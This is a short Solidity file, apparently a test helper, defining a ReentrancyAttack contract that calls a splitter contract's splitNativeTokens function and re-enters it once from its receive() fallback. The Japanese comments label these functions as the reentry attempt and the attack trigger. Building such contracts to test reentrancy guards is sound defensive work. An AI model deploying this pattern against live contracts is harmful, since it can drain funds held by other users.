// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISplitter {
    function splitNativeTokens(address[] memory recipients) external payable;
}

contract ReentrancyAttack {
    ISplitter public splitter;
    bool public attackInitiated = false;

    constructor(address _splitter) {
        splitter = ISplitter(_splitter);
    }

    // フォールバック関数で再入を試みる
    receive() external payable {
        if (!attackInitiated) {
            attackInitiated = true;
            address[] memory recipients = new address[](1);
            recipients[0] = address(this);
            splitter.splitNativeTokens{value: 1 ether}(recipients);
        }
    }

    // 攻撃を開始する関数
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        address[] memory recipients = new address[](1);
        recipients[0] = address(this);
        splitter.splitNativeTokens{value: 1 ether}(recipients);
    }
} 